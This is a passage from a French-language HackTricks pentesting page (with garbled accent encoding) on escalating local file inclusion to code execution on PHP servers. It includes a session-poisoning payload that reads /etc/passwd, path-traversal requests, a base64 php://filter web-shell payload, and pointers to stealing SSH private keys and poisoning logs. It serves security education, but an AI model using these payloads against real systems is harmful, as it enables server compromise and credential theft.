/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
D√©finissez le cookie sur `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Utilisez la LFI pour inclure le fichier de session PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Si ssh est actif, v√©rifiez quel utilisateur est utilis√© (/proc/self/status & /etc/passwd) et essayez d'acc√©der √† **\<HOME>/.ssh/id\_rsa**

### **Via** **logs** **vsftpd**

Les journaux de ce serveur FTP sont stock√©s dans _**/var/log/vsftpd.log.**_ Si vous avez une LFI et pouvez acc√©der √† un serveur vsftpd expos√©, vous pouvez essayer de vous connecter en d√©finissant la charge utile PHP dans le nom d'utilisateur, puis acc√©der aux journaux en utilisant la LFI.

### Via le filtre php base64 (en utilisant base64)

comme indiqu√© dans [cet](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, le filtre PHP base64 ignore simplement les caract√®res non base64. Vous pouvez l'utiliser pour contourner la v√©rification de l'extension de fichier : si vous fournissez une base64 qui se termine par ".php", il ignorera simplement le "." et ajoutera "php" √† la base64. Voici un exemple de charge utile :
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via les filtres php (pas de fichier n√©cessaire)

Ce [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explique que vous pouvez utiliser les **filtres php pour g√©n√©rer du contenu arbitraire** en sortie. Cela signifie essentiellement que vous pouvez **g√©n√©rer du code php arbitraire** pour l'inclusion **sans avoir besoin de l'√©crire** dans un fichier.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via une erreur de segmentation

**T√©l√©chargez** un fichier qui sera stock√© de mani√®re **temporaire** dans `/tmp`, puis dans la **m√™me requ√™te**, d√©clenchez une **erreur de segmentation**, et ensuite le **fichier temporaire ne sera pas supprim√©** et vous pourrez le rechercher.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via le stockage temporaire des fichiers de Nginx

Si vous avez trouv√© une **inclusion de fichier local** et que **Nginx** est en cours d'ex√©cution devant PHP, vous pourriez √™tre en mesure d'obtenir une RCE avec la technique suivante :

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

Si vous avez trouv√© une **inclusion de fichier local**, m√™me si vous **n'avez pas de session** et que `session.auto_start` est `Off`. Si vous fournissez **`PHP_SESSION_UPLOAD_PROGRESS`** dans les donn√©es **multipart POST**, PHP **activera la session pour vous**. Vous pourriez exploiter cela pour obtenir une RCE :

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via les t√©l√©chargements de fichiers temporaires sous Windows

Si vous avez trouv√© une **inclusion de fichier local** et que le serveur s'ex√©cute sous **Windows**, vous pourriez obtenir une RCE :

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via phpinfo() (file\_uploads = on)

Si vous avez trouv√© une **inclusion de fichier local** et qu'un fichier expose **phpinfo()** avec file\_uploads = on, vous pouvez obtenir une RCE :

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + divulgation de chemin

Si vous avez trouv√© une **inclusion de fichier local** et que vous **pouvez exfiltrer le chemin** du fichier temporaire MAIS que le **serveur** v√©rifie si le **fichier √† inclure contient des marques PHP**, vous pouvez essayer de **contourner cette v√©rification** avec cette **condition de course** :

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via une attente √©ternelle + force brute

Si vous pouvez exploiter l'inclusion de fichier local pour **t√©l√©charger des fichiers temporaires** et faire **suspendre** l'ex√©cution PHP du serveur, vous pouvez ensuite **forcer la recherche de noms de fichiers pendant des heures** pour trouver le fichier temporaire :

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Jusqu'√† l'erreur fatale

Si vous incluez l'un des fichiers `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Vous devez inclure le m√™me fichier 2 fois pour provoquer cette erreur).

**Je ne sais pas √† quoi cela peut servir, mais cela pourrait √™tre utile.**\
_M√™me si vous provoquez une erreur fatale de PHP, les fichiers temporaires t√©l√©charg√©s par PHP sont supprim√©s._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## R√©f√©rences

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes pour les bugs de cryptographie.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof sont lanc√©es uniquement lorsque les clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bogue.

**Acqu√©rez de l'exp√©rience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez une l√©gende du hacking web3**\
Gagnez des points de r√©putation avec chaque bogue v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez √† gagner gr√¢ce √† vos hacks !

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Vous travaillez dans une **entreprise de cybers√©curit√©** ? Vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ? ou souhaitez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PRs au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
